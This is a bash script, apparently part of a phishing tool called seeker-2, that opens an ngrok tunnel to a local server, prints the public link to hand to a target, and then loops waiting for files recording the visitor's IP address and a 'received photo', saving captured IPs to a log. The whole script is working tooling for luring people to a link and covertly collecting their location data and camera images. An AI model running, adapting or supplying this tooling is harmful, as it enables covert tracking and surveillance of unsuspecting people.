trap 'printf "\n";stop' 2


stop() {

checkngrok=$(ps aux | grep -o "ngrok" | head -n1)
checkphp=$(ps aux | grep -o "php" | head -n1)
checkssh=$(ps aux | grep -o "ssh" | head -n1)
if [[ $checkngrok == *'ngrok'* ]]; then
pkill -f -2 ngrok > /dev/null 2>&1
killall -2 ngrok > /dev/null 2>&1
fi

if [[ $checkphp == *'php'* ]]; then
killall -2 php > /dev/null 2>&1
fi
if [[ $checkssh == *'ssh'* ]]; then
killall -2 ssh > /dev/null 2>&1
fi
exit 1

}
catch_ip() {

ip=$(grep -a 'IP:' ip.txt | cut -d " " -f2 | tr -d '\r')
IFS=$'\n'
printf "\e[1;93m[\e[0m\e[1;77m+\e[0m\e[1;93m] IP:\e[0m\e[1;77m %s\e[0m\n" $ip

cat ip.txt >> saved.ip.txt


}


checkfound() {

printf "\n"
printf "\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Waiting to open link,\e[0m\e[1;77m Press Ctrl + C to exit...\e[0m\n"|lolcat
while [ true ]; do


if [[ -e "ip.txt" ]]; then
printf "\n\e[1;92m[\e[0m+\e[1;93m] Your Link Opened\n"|lolcat
catch_ip
rm -rf ip.txt

fi
sleep 0.5

if [[ -e "Log.log" ]]; then
printf "\n\e[1;92m[\e[0m+\e[1;92m] Received photo in internal storage\e[0m\n"|lolcat
rm -rf Log.log
echo
fi
sleep 0.5

done 

}

starting () {
printf "\n\n\033[92m [>]\033[96m Starting ngrok.....\n\n"
cd ~/seeker-2
killall -2 ngrok > /dev/null 2>&1
./ngrok http 8080 > /dev/null 2>&1 &
sleep 13

link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[0-9a-z]*\.ngrok.io")
printf "\e[1;92m [\e[0m<\e[1;92m] Ngrok link:\e[0m\e[1;77m %s\e[0m\n\n" $link
}
starting